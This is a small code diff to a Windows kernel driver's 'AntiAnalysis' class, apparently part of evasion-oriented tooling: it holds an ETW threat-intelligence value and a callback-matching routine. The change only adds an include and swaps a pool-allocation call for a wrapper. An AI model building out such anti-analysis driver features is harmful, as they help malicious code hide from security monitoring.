@@ -1,6 +1,7 @@
 #include "pch.h"
 #include "AntiAnalysis.hpp"
 #include "MemoryAllocator.hpp"
+#include "MemoryHelper.hpp"
 
 AntiAnalysis::AntiAnalysis() {
 	this->PrevEtwTiValue = 0;
@@ -608,7 +609,7 @@ NTSTATUS AntiAnalysis::MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_P
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
 		if (info)
 			ExFreePoolWithTag(info, DRIVER_TAG);
-		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
+		info = (PRTL_PROCESS_MODULES)AllocateMemory(infoSize);
 
 		if (!info) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
